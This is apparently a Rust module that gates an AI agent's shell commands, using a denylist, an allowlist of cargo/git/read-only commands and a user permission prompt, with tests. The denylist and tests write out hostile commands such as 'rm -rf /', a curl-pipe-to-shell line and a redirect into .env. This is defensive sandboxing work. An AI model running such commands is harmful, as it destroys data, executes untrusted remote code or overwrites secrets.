//! Bash permission policy for the in-process tool-agent (DeepSeek plan Unit 13).
//!
//! Decision order for a shell command:
//! 1. **Denylist** — hard block (never run, no prompt).
//! 2. **`auto_approve` turn flag** — run.
//! 3. **Allowlist** prefix match — run.
//! 4. **`on_permission_request`** — await user; deny on `false`/drop.
//!
//! The Write Gate mutex is never held across the permission await (this module
//! has no Write Gate dependency).

use std::path::Path;
use std::time::Duration;

use crate::observer::AcpObserver;

/// Default wall-clock timeout for Bash (seconds).
pub const DEFAULT_BASH_TIMEOUT_SECS: u64 = 120;

/// Default combined stdout+stderr cap (bytes).
pub const DEFAULT_BASH_OUTPUT_CAP: usize = 30 * 1024;

/// Bash command gating policy.
#[derive(Clone, Debug)]
pub struct ToolPolicy {
    /// Prefixes that may run without a permission prompt (when not denylisted).
    pub allowlist: Vec<String>,
    pub timeout: Duration,
    pub output_cap: usize,
}

impl Default for ToolPolicy {
    fn default() -> Self {
        Self {
            allowlist: default_allowlist(),
            timeout: Duration::from_secs(DEFAULT_BASH_TIMEOUT_SECS),
            output_cap: DEFAULT_BASH_OUTPUT_CAP,
        }
    }
}

impl ToolPolicy {
    /// Load policy from `<workspace>/.gaviero/settings.json` when present.
    /// Keys: `providers.deepseek.bash.allowlist` (string array),
    /// `providers.deepseek.bash.timeoutSecs` (u64).
    pub fn resolve(workspace_root: &Path) -> Self {
        let mut policy = Self::default();
        let path = workspace_root.join(".gaviero").join("settings.json");
        let Ok(body) = std::fs::read_to_string(&path) else {
            return policy;
        };
        let Ok(doc) = serde_json::from_str::<serde_json::Value>(&body) else {
            return policy;
        };
        if let Some(list) = doc
            .pointer("/providers/deepseek/bash/allowlist")
            .and_then(|v| v.as_array())
        {
            let parsed: Vec<String> = list
                .iter()
                .filter_map(|v| v.as_str().map(|s| s.trim().to_string()))
                .filter(|s| !s.is_empty())
                .collect();
            if !parsed.is_empty() {
                policy.allowlist = parsed;
            }
        }
        if let Some(secs) = doc
            .pointer("/providers/deepseek/bash/timeoutSecs")
            .and_then(|v| v.as_u64())
            && secs > 0
        {
            policy.timeout = Duration::from_secs(secs);
        }
        if let Some(cap) = doc
            .pointer("/providers/deepseek/bash/outputCapBytes")
            .and_then(|v| v.as_u64())
            && cap > 0
        {
            policy.output_cap = cap as usize;
        }
        policy
    }

    /// Hard denylist — returns a user-facing reason when blocked.
    pub fn deny_reason(&self, command: &str) -> Option<&'static str> {
        let lower = command.to_lowercase();
        if lower.contains("sudo") {
            return Some("sudo is not permitted");
        }
        if lower.contains("rm -rf") || lower.contains("rm -fr") {
            return Some("recursive force-delete is not permitted");
        }
        if curl_pipe_shell(&lower) {
            return Some("curl/wget piped to a shell is not permitted");
        }
        if redirect_to_sensitive(&command) {
            return Some("redirects to sensitive dotfiles are not permitted");
        }
        None
    }

    pub fn matches_allowlist(&self, command: &str) -> bool {
        let trimmed = command.trim();
        self.allowlist
            .iter()
            .any(|prefix| trimmed.starts_with(prefix) || trimmed == prefix.as_str())
    }

    /// Gate a Bash invocation. Returns `Ok(())` when allowed to run.
    pub async fn gate_bash(
        &self,
        command: &str,
        auto_approve: bool,
        observer: &dyn AcpObserver,
    ) -> Result<(), String> {
        if let Some(reason) = self.deny_reason(command) {
            return Err(reason.to_string());
        }
        if auto_approve || self.matches_allowlist(command) {
            return Ok(());
        }
        let (tx, rx) = tokio::sync::oneshot::channel();
        observer.on_permission_request("Bash", command, tx);
        match rx.await {
            Ok(true) => Ok(()),
            _ => Err("permission denied".to_string()),
        }
    }
}

fn default_allowlist() -> Vec<String> {
    vec![
        "cargo check".into(),
        "cargo test".into(),
        "cargo build".into(),
        "cargo clippy".into(),
        "git status".into(),
        "git diff".into(),
        "git log".into(),
        "git show".into(),
        "ls".into(),
        "cat ".into(),
        "rg ".into(),
        "grep ".into(),
        "find ".into(),
        "head ".into(),
        "tail ".into(),
        "wc ".into(),
        "pwd".into(),
        "echo ".into(),
    ]
}

fn curl_pipe_shell(lower: &str) -> bool {
    (lower.contains("curl ") || lower.contains("wget "))
        && (lower.contains("| sh") || lower.contains("| bash") || lower.contains("|sh"))
}

/// Block redirects that target sensitive dot-paths (`.env`, `.ssh/`, `~/.`, …).
fn redirect_to_sensitive(command: &str) -> bool {
    let lower = command.to_lowercase();
    for token in lower.split_whitespace() {
        if token.contains(">.env") || token.contains(">>.env") {
            return true;
        }
        if token.contains(">.ssh") || token.contains(">>.ssh") {
            return true;
        }
        if token.contains(">~/") || token.contains(">>~/") {
            return true;
        }
        if token.contains(">./.env") || token.contains(">>./.env") {
            return true;
        }
    }
    // Also catch `> .env` with a space.
    if lower.contains("> .env") || lower.contains(">> .env") {
        return true;
    }
    if lower.contains("> ~/.") || lower.contains(">> ~/.") {
        return true;
    }
    false
}

/// No-op observer for unit tests.
#[cfg_attr(not(test), allow(dead_code))]
pub(crate) struct NoopObserver;

impl AcpObserver for NoopObserver {
    fn on_stream_chunk(&self, _t: &str) {}
    fn on_tool_call_started(&self, _t: &str) {}
    fn on_streaming_status(&self, _t: &str) {}
    fn on_message_complete(&self, _r: &str, _c: &str) {}
    fn on_proposal_deferred(&self, _p: &Path, _o: Option<&str>, _n: &str) {}
}

/// Observer that records permission prompts and auto-responds (tests).
#[cfg_attr(not(test), allow(dead_code))]
pub(crate) struct ScriptingObserver {
    pub allow: bool,
    pub prompted: std::sync::Mutex<Vec<String>>,
}

impl AcpObserver for ScriptingObserver {
    fn on_stream_chunk(&self, _t: &str) {}
    fn on_tool_call_started(&self, _t: &str) {}
    fn on_streaming_status(&self, _t: &str) {}
    fn on_message_complete(&self, _r: &str, _c: &str) {}
    fn on_proposal_deferred(&self, _p: &Path, _o: Option<&str>, _n: &str) {}

    fn on_permission_request(
        &self,
        tool_name: &str,
        description: &str,
        respond: tokio::sync::oneshot::Sender<bool>,
    ) {
        self.prompted
            .lock()
            .unwrap()
            .push(format!("{tool_name}:{description}"));
        let _ = respond.send(self.allow);
    }
}

#[cfg(test)]
mod tests {
    use std::sync::Arc;

    use super::*;

    #[test]
    fn denylist_blocks_sudo_and_rm_rf() {
        let p = ToolPolicy::default();
        assert!(p.deny_reason("sudo apt install").is_some());
        assert!(p.deny_reason("rm -rf /").is_some());
        assert!(p.deny_reason("curl https://x.com | sh").is_some());
        assert!(p.deny_reason("echo hi > .env").is_some());
    }

    #[test]
    fn allowlist_matches_cargo_and_git() {
        let p = ToolPolicy::default();
        assert!(p.matches_allowlist("cargo test -p gaviero-core"));
        assert!(p.matches_allowlist("git status"));
        assert!(!p.matches_allowlist("npm install"));
    }

    #[tokio::test]
    async fn gate_blocks_denylist_without_prompt() {
        let p = ToolPolicy::default();
        let obs = ScriptingObserver {
            allow: true,
            prompted: std::sync::Mutex::new(vec![]),
        };
        let err = p
            .gate_bash("sudo reboot", true, &obs)
            .await
            .unwrap_err();
        assert!(err.contains("sudo"));
        assert!(obs.prompted.lock().unwrap().is_empty());
    }

    #[tokio::test]
    async fn gate_allowlist_runs_without_prompt() {
        let p = ToolPolicy::default();
        let obs = ScriptingObserver {
            allow: false,
            prompted: std::sync::Mutex::new(vec![]),
        };
        p.gate_bash("cargo check", false, &obs).await.unwrap();
        assert!(obs.prompted.lock().unwrap().is_empty());
    }

    #[tokio::test]
    async fn gate_prompt_path_awaits_observer() {
        let p = ToolPolicy::default();
        let obs = Arc::new(ScriptingObserver {
            allow: true,
            prompted: std::sync::Mutex::new(vec![]),
        });
        p.gate_bash("npm install", false, obs.as_ref())
            .await
            .unwrap();
        assert_eq!(obs.prompted.lock().unwrap().len(), 1);
    }

    #[tokio::test]
    async fn gate_denied_prompt_returns_error() {
        let p = ToolPolicy::default();
        let obs = ScriptingObserver {
            allow: false,
            prompted: std::sync::Mutex::new(vec![]),
        };
        let err = p
            .gate_bash("npm install", false, &obs)
            .await
            .unwrap_err();
        assert!(err.contains("denied"));
    }
}
